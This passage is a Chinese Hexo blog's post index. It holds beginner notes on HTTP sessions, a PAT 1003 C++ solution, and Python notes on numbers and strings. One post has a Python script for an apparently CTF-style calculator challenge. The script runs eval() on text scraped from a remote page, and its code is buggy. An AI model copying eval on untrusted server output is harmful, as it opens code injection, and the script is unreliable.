问题3：使用session会话session是一次浏览器和服务器的会话对象，session也是缓存，是内容，是块数据。因为我们访问网页使用的HTTP协议是无状态的，没有任何关系，快速的。所以我们如果想要关联客户的信息就需要一种办法能够把客户的信息联系在一起，这个方法就是cookie。但是cookie是把信息储存在用户本地，它在一个域名下是全局的。不安全又很容易的被修改。所以session就出现了，它储存在服务器上，通过它关联同一个用户的信息，这样用户在访问不同的页面的时候我们就知道对方是同一个人，而不需要每次无状态的访问都需要用户登录/关联了。 脚本代码1234567891011import requestsimport res = requests.Session()t = s.get('http://123.207.149.64:23331/calculator/')print(t.text)value = re.compile(r'&lt;form action=\"\" method=\"GET\"&gt;&lt;span id=\"exp\"&gt;(.*?)&lt;/span&gt;')n = re.findall(value, t.text, re.S | re.M)print('result:\\n\\n%s=%d\\n' % (n, eval(n)))ans = eval(n)f = t.get('http://123.207.149.64:23331/calculator/', params=&#123;'answer': ans&#125;)print(f.text) 结果运行时出现错误：AttributeError: module ‘requests’ has no attribute ‘session’，查了安装的requests库，里边有session模块，但就是运行说没有！！查了好多原因，也重装了requests，还是不行，做这个题用了太长时间了，今天脑子被他弄得晕晕的，决定明天在弄。","categories":[],"tags":[]},{"title":"每日一题 1003","slug":"每日一题1003","date":"2019-03-26T03:17:36.805Z","updated":"2019-03-26T04:01:20.619Z","comments":true,"path":"2019/03/26/每日一题1003/","link":"","permalink":"https://hanqd.github.io/2019/03/26/每日一题1003/","excerpt":"1003 我要通过题目描述“答案正确”是自动判题系统给出的最令人欢喜的回复。本题属于 PAT 的“答案正确”大派送 —— 只要读入的字符串满足下列条件，系统就输出“答案正确”，否则输出“答案错误”。得到“答案正确”的条件是：","text":"1003 我要通过题目描述“答案正确”是自动判题系统给出的最令人欢喜的回复。本题属于 PAT 的“答案正确”大派送 —— 只要读入的字符串满足下列条件，系统就输出“答案正确”，否则输出“答案错误”。得到“答案正确”的条件是： 字符串中必须仅有 P、 A、 T这三种字符，不可以包含其它字符； 任意形如 xPATx 的字符串都可以获得“答案正确”，其中 x 或者是空字符串，或者是仅由字母 A 组成的字符串； 如果 aPbTc 是正确的，那么 aPbATca 也是正确的，其中 a、 b、 c 均或者是空字符串，或者是仅由字母 A 组成的字符串。现在就请你为 PAT 写一个自动裁判程序，判定哪些字符串是可以获得“答案正确”的。 输入格式：每个测试输入包含 1 个测试用例。第 1 行给出一个正整数 n (&lt;10)，是需要检测的字符串个数。接下来每个字符串占一行，字符串长度不超过 100，且不包含空格。 输出格式：每个字符串的检测结果占一行，如果该字符串可以获得“答案正确”，则输出 YES，否则输出 NO。 题目分析 条件1：字符串仅有P、A、T这三个字符，包括其他字符则答案错误； 条件2：xPATx形式的字符串正确，其中x为空字符串或者A，例如：PAT、APATA、AAPATAA，要求P左边的A的个数和T右边的个数一样，并且P和T仅有一个； 条件3：aPbTc是正确的，则aPbATca也是正确的，其中a,b,c为空字符串或者A，例如：APATA、APAATAA、AAPATAA、AAPAATAAAA根据P左边，T右边和P、T中间的A的个数来看，可找到规律，即left*mid=right,即答案正确。 C++代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;iostream&gt; #include &lt;string.h&gt; using namespace std; int main() &#123; int n; cin&gt;&gt;n; string a; int len=0; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;a; //p是P的个数，t是T的个数，left是P左边A的个数，mid,right分别是对应位置A的个数 int p=0,t=0,left=0,mid=0,right=0; len=a.length(); for(int j=0;j&lt;len;j++) &#123; //字符串为A，并且前面没出现过P和T，P左边A的个数 if(a[j]=='A'&amp;&amp;p==0&amp;&amp;t==0) &#123; left++; continue; &#125; //P的个数 if(a[j]=='P') &#123; p++; continue; &#125; //中间A的个数，前面出现了P且个数为1，前面不能出现T if(a[j]=='A'&amp;&amp;p==1&amp;&amp;t==0) &#123; mid++; continue; &#125; //T的个数，并且前边P和T中间出现了A，防止出现PT情况 if(a[j]=='T'&amp;&amp;mid&gt;=1) &#123; t++; continue; &#125; //右边A的个数，前边出现了P和T，个数为1 if(a[j]=='A'&amp;&amp;p==1&amp;&amp;t==1) &#123; right++; continue; &#125; else &#123; break; &#125; &#125; //判断条件：P和T的个数为1，A的个数：左边乘中间等于右边，输出YES if(p==1&amp;&amp;t==1&amp;&amp;(left*mid==right)) &#123; cout&lt;&lt;\"YES\"&lt;&lt;endl; &#125; else &#123; cout&lt;&lt;\"NO\"&lt;&lt;endl; &#125; &#125; return 0; &#125;","categories":[],"tags":[]},{"title":"Python笔记——数据类型（整数、浮点数、数据类型转换）","slug":"Python数据类型（整数、浮点数、数据类型转换）","date":"2019-03-18T08:38:50.653Z","updated":"2019-03-18T09:06:28.161Z","comments":true,"path":"2019/03/18/Python数据类型（整数、浮点数、数据类型转换）/","link":"","permalink":"https://hanqd.github.io/2019/03/18/Python数据类型（整数、浮点数、数据类型转换）/","excerpt":"今天安装了pycharm,界面很好看，是一款好用的编译器。继续学习Python！","text":"今天安装了pycharm,界面很好看，是一款好用的编译器。继续学习Python！ 整数（int）&emsp; 整数包括正整数、负整数和零。Python中的整数范围是很大的。Python中整数还可以以几种不同的进制进行书写。0+“进制标志”+数字代表不同进制的数，进制标志有以下几种： 0o[0O]数字 表示八进制整数（例如：0o24/0O24） 0x[0X]数字 表示十六进制整数（例如：0x3F/0X3F） 0b[0B]数字 表示二进制整数（例如：0b101/0B101） 不带进制标志的为十进制数。&emsp; 注意：每种进制开头数字都是0；八进制的数字0后是小写字母o或大写字母O；但十进制不得以数字0开头书写；每种进制书写时数码不得超过进制规定的数码范围。整数运算符 运算符 描述 ** 乘方运算符 * 乘法运算符 / 除法运算符 // 整除运算符 % 取余运算符 + 加法运算符 - 减法运算符 &#124; 位或 ^ 位异或 &amp; 位与 &lt;&lt; 左移运算 &gt;&gt; 右移运算 “//”运算符就是取商而丢弃余数，比如:14//4=3|、^、&amp;、&lt;&lt;、&gt;&gt;运算符都是位运算符，要依据二进制形式进行运算。 运算符优先级从高到低排列如下： ** *、/、% +、- |、^、&amp;、&lt;&lt;、&gt;&gt; 在同一个式子中，可以使用括号来修改运算符的优先级，即括号具有最高优先级。不必强记运算符的优先级，在没有把握的情况下可以运用括号。注意：“/”运算符的运算结果为浮点数，即时是两个整数相除。 浮点数（float）浮点数就是常用的带小数的数，当然整数部分也可以为零。浮点数的书写除了一般形式（如3.14）外，还有以下几种表示方法： 19. 小数部分为零，可以不写； .098 整数部分为零，可以不写； -2e3 科学计数法，表示-2*10^3 类型转换Python中常用的数据类型的相互转换，所使用函数如下： str(object=’’) 可以将整数和浮点数转换为字符串，默认建立空字符串 int(x,base=10) 将数字字符串或数值转换为整数（base表示进制） float(x) 将字符串或数值转换为浮点数 此外：str()可以创建一个空字符串，int()也可以建立一个默认值为0的整数，float()可以建立一个默认值为0.0的浮点数。【实例】注意：将字符串形式的数值转换为整数时，其中只能包含数字。input()函数接受键盘输入时，无论输入的是整数、浮点数还是字符串，Python得到的都是字符串，那么当需要整数或浮点数时都要进行类型转换。","categories":[],"tags":[]},{"title":"Python笔记——数据类型（字符串）","slug":"Python数据类型（字符串）","date":"2019-03-17T14:32:02.464Z","updated":"2019-03-17T14:56:50.802Z","comments":true,"path":"2019/03/17/Python数据类型（字符串）/","link":"","permalink":"https://hanqd.github.io/2019/03/17/Python数据类型（字符串）/","excerpt":"字符串主要用于存储和表示文本。Python中的字符串通常由“ ‘ ”、双引号“ “” ”、三个单引号或三个双引号包围的一串字符组成。","text":"字符串主要用于存储和表示文本。Python中的字符串通常由“ ‘ ”、双引号“ “” ”、三个单引号或三个双引号包围的一串字符组成。 Python的简单数据类型字符串 字符串主要用于存储和表示文本。Python中的字符串通常由“ ‘ ”、双引号“ “” ”、三个单引号或三个双引号包围的一串字符组成。 注意：单引号和双引号都是英文字符中的符号。 三种表示方法的区别和联系： 单引号字符串与双引号字符串本质上是相同的。但是单引号字符串里边不允许再出现单引号，例如：’aa’ss’cc’，这种是错误的，但是可以使用转义字符来输出’：’aaa”ss”aa’，这样正确，同理，双引号字符串也是，双引号里不能再出现双引号，但可以用转义字符。 三引号字符串可以由多行组成，单引号或双引号不行，当需要使用大段多行的字符串行就使用它。1234'''This is a function.Return a tuple.''' 转义字符串 \\n 换行符 \\t 制表符（Tab） \\r 回车（Enter） \\ “\\”字符 \\’ 单引号字符串中的单引号 \\” 双引号里的双引号 字符串运算“+”：连接字符串乘号 ：单字符串的多次连接‘aaa’+’bbb’ ——&gt;’aaabbb’“python”*3 ——&gt;python python python 字符串处理函数常见的字符串函数 string.capitalize() 将字符串的第一个字母大写 string.count() 获得字符串中某一子字符串的数目 string.find() 获得字符串中某一子字符串的起始位置，无则返回-1 string.isalnum() 检测字符串是仅包含0-9A-Za-z string.isalpha() 检测字符串是仅包含A-Za-z string.isdigit() 检测字符串是仅包含数字 string.islower() 检测字符串是否均为小写字母 string.isspace() 检测字符串中所有字符是否均为空白字符 string.istitle() 检测字符串中的单词是否为首字母大写 string.isupper() 检测字符串是否均为大写字母 string.join() 连接字符串 string.lower() 将字符串全部转换为小写 string.split() 分割字符串 string.swapcase() 将字符串中大写字母转换为小写，小写字母转换为大写 string.title() 将字符串中的单词首字母大写 string.upper() 将字符串中的全部字母转换为大写 len(string) 获取字符串长度 其中split()函数返回以指定的字符将字符串分割成为列表形式并返回，但并不改变原字符串，原型如下：split([sep[,maxsplit]]) sep：可选参数，指定分割的字符，默认为空格 maxsplit：可选参数，分割次数 join()函数将原字符串插入参数字符串中的每两个字符之间。如果参数字符串中只有一个字符，那么返回参数字符串。同样，join()并不改变原字符串，只是返回一个新的字符串。","categories":[],"tags":[]},{"title":"你好，hexo","slug":"你好，hexo","date":"2019-03-15T08:45:25.000Z","updated":"2019-03-15T08:45:25.929Z","comments":true,"path":"2019/03/15/你好，hexo/","link":"","permalink":"https://hanqd.github.io/2019/03/15/你好，hexo/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2019-03-15T03:01:22.322Z","updated":"2019-03-16T04:18:31.716Z","comments":true,"path":"2019/03/15/hello-world/","link":"","permalink":"https://hanqd.github.io/2019/03/15/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}